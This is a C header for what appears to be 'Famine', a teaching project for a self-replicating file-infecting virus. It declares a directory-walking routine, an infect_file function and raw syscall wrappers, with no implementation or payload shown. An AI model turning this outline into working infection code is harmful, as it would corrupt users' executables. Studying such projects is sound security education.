#ifndef FAMINE_H
#define FAMINE_H

////////////////////////////////////////////////////////////////////////////////
/// INCLUDES 
////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>

////////////////////////////////////////////////////////////////////////////////
/// DEFINES
////////////////////////////////////////////////////////////////////////////////

#define FILE_TYPE 8

#define DIR_MAX 12

#define BUFF_SIZE 1024*1024*5

#define VOID __attribute__((unused))


////////////////////////////////////////////////////////////////////////////////
/// STRUCTURES
////////////////////////////////////////////////////////////////////////////////

struct linux_dirent64
{
	unsigned long d_ino;
	unsigned long d_off;
	unsigned short d_reclen;
	unsigned char d_type;
	char d_name[];
};

struct directory
{
	const char path[DIR_MAX];
	char buf[PATH_MAX];
	int size;
};

////////////////////////////////////////////////////////////////////////////////
/// PROTOTYPES 
////////////////////////////////////////////////////////////////////////////////

// FAMINE_C
void famine(struct directory *dir);

// INFECT_C
__attribute__((hot)) void infect_file(const char *filename);

// INLINE_C
int _open(const char *pathname, int flags, long mode);
int _close(int fd);
int _write(int fd, const void *buf, long count);
int _getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
int _stat(const char *pathname, struct stat *statbuf);
int _getuid(void);

// UTILS_C
unsigned long _strlen(const char *str);
void _bzero(char *str, const unsigned long index);

#endif
